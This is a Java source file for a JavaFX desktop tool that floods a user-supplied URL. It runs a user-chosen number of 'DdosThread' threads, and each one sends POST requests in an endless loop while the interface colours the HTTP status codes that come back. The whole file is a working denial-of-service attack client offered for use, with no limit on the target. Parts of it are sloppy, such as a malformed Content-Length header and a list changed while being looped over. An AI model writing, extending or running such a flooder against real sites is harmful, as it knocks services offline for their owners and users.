package sample;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Orientation;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.paint.Paint;
import javafx.scene.shape.Circle;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Controller {
    private static final String URL_REGEX =
            "^((((http?|ftps?|gopher|telnet|nntp)://)|(mailto:|news:))" +
                    "(%[0-9A-Fa-f]{2}|[-()_.!~*';/?:@&=+$,A-Za-z0-9])+)" +
                    "([).!';/?:,][[:blank:]])?$";

    private static final Pattern URL_PATTERN = Pattern.compile(URL_REGEX);
    @FXML
    public Label code;
    public Label status_label;
    public ScrollPane myScrollPane;
    public Circle circle;
    @FXML
    private TextField url;
    @FXML
    private TextField nThreads;

    @FXML
    private ListView<String> status;

    @FXML private ProgressBar pro;

    @FXML
    ObservableList<String> items = FXCollections.observableArrayList ();


    public boolean validateConnection(String requests){
        if (requests == null  || requests.equals("")) {
            return false;
        }
        Matcher matcher = URL_PATTERN.matcher(requests);
        return matcher.matches();
    }
    public  String getAttackurl() {
        String text_url;
        text_url = url.getText();
        return text_url;
    }
    public  int getNThreads() {
        String nthreads;
        nthreads = nThreads.getText();
        int counter=Integer.parseInt(nthreads);
        return counter;
    }


    public void OnAttack() throws Exception {
        boolean stat = validateConnection(getAttackurl());
        if(stat){
            Attack_begin(getAttackurl());
        }
        else {
            code.setText("invalid format");
        }
    }
    ArrayList<DdosThread> threads = new ArrayList<DdosThread>();
    Print_attack attack;
    DdosThread thread;

    public void Attack_begin(String url) throws Exception {
        int j=getNThreads();
        this.running.set(true);
        for (int i = 0; i < j; i++) {
            thread = new DdosThread(this , url);
            attack = new Print_attack();
            attack.start();
            pro.setProgress(i);
            threads.add(thread);
            thread.start();
        } }

    // stopAttack
    public void stopAttack(){
        for(DdosThread thres : this.threads){
            this.running.set(false);
            this.threads.remove(thres);
        }
    }

    public void restart(){
        for(DdosThread thres : this.threads){
            this.running.set(false);
            thres.stop();
        }
    }

    public final AtomicBoolean running = new AtomicBoolean(true);

    public void StopAttack(ActionEvent actionEvent) {
        if (!this.running.get()){
            return ;
        }
        this.stopAttack();
    }


    public  class DdosThread extends Thread {
        //private final String request = "http://localhost:3000/idea/ideas/";
        private final URL url;
        String param;
        Controller control;
        public DdosThread(Controller com , String request) throws Exception {
            this.control = com;
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }


        @Override
        public void run() {
            while (running.get()) {
                try {

                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setDoOutput(true);
                    connection.setDoInput(true);
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("charset", "utf-8");
                    connection.setRequestProperty("Host", "localhost");
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    connection.setRequestProperty("Content-Length", param);
                    items.add(this + " The status code is: " + connection.getResponseCode()+"\n");
                    status.setItems(items);

                    Set<Node> nodes = myScrollPane.lookupAll(".scroll-bar");
                    for (final Node node : nodes) {
                        if (node instanceof ScrollBar) {
                            ScrollBar sb = (ScrollBar) node;
                            if (sb.getOrientation() == Orientation.VERTICAL) {
                                sb.setPrefWidth(40);
                            }
                        }
                    }

                    int codee = connection.getResponseCode();
                    control.attack.printMessage(codee + "");
                    connection.getInputStream();

                } catch (Exception e) {
                    System.out.println(e.getMessage());
//                    if("Connection refused: connect".trim().equalsIgnoreCase(e.getMessage().trim())){
                        control.attack.printMessage( 500 + "");
//                    }

                }
            } }
    }
    class Print_attack extends Thread {
        public synchronized void printMessage(String message ) {
            try {
                Platform.runLater(() -> {
                    code.setText(message+"\n");
                    switch (message) {
                        case "200":
                            status_label.setStyle("-fx-text-fill: #20C613; ");
                            circle.setFill(Paint.valueOf("#20C613"));

                            break;
                        case "404":
                            status_label.setStyle("-fx-text-fill: #BCC625; ");
                            circle.setFill(Paint.valueOf("#BCC625"));
                            break;
                        case "500":
                            status_label.setStyle("-fx-text-fill: #C62A22; ");
                            circle.setFill(Paint.valueOf("#C62A22"));
                            break;
                    }
                    System.out.println(message);
                });


            } catch (Exception e) {
                System.out.println(e);

            }
        }
    }}